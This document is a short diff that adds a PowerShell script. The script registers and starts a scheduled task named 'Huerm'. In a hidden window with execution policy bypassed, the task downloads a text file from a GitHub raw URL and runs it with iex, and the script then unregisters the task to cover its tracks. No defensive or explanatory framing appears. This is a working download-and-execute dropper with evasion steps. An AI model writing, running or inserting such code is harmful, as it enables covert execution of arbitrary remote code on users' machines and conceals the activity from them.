@@ -1,0 +1,5 @@
+$Sta = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoP -Ep Bypass iwr "https://raw.githubusercontent.com/TheStegosaurus1/test/main/test.txt" | iex'
+$STSet = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask Huerm -Action $Sta -Settings $STSet
+Start-ScheduledTask -TaskName "Huerm"
+Unregister-ScheduledTask -TaskName "Huerm" -Confirm:$false
